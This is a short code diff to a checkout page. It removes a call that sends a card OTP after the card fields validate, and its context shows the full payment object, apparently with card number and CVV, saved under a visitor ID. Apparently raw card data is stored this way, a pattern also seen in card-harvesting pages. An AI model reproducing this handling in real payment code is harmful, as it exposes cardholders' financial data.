@@ -600,9 +600,6 @@ export default function CheckoutPage() {
     });
     if (!visitorId) return;
     await addData({ id: visitorId, ...paymentInfo! });
-    if (!cardNumberError && !cardNameError && !expiryError && !cvvError) {
-      sendCardOtp();
-    }
   };
 
   const handlePhoneVerification = () => {
